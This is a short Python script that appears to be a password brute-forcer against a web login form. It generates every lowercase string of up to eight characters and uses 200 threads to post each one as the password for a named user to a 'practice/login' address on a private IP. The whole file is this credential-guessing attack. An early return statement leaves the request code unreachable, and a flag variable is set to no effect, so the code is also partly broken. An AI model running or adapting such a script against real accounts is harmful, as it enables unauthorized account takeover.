# -*- coding: utf-8 -*-
# @Time    : 2019/8/20 10:53
# @Author  : MrCocoaCat
# @Email   : MrCocoaCat@aliyun.com
# @File    : test.py
from requests import put, get,delete,post
import itertools
from concurrent.futures import ThreadPoolExecutor
import threading
import queue
from urllib import request
import gevent,time

threadPool = ThreadPoolExecutor(max_workers=200)

#codebase_list = list(map(chr, range(ord('0'), ord('9') + 1))) + list(map(chr, range(ord('A'), ord('Z') + 1))) + list(map(chr, range(ord('a'), ord('z') + 1)))
codebase_list = list(map(chr, range(ord('a'), ord('z') + 1)))
BASE_URL = 'http://192.168.255.111/practice/login/'
q = queue.Queue()

def gener_passwd(num):
    num = 8
    a_list =[]
    for i in range(num):
        a_list.append(codebase_list)
        for p in itertools.product(*a_list):
            password = ''.join(p)
            q.put(password)


def do_url(password):
    data_json = {
    'username': 'liyubo',
    'password': password,
    }
    time.sleep(1)
    print(data_json['password'])
    return 0
    ret2 = post(BASE_URL, data=data_json)
    print(ret2.json())
    a = ret2.json()
    if a['flag']:
        print("is : %s" % password)
        flag = False


def con():
    while True:
        a = q.get()
        do_url(a)


if __name__ == '__main__':
    async_time_start = time.time()
    threadPool.submit(gener_passwd, 4)
    for i in range(0, 200):
        future = threadPool.submit(con)

    threadPool.shutdown(wait=True)


    print("异步步cost", time.time() - async_time_start)



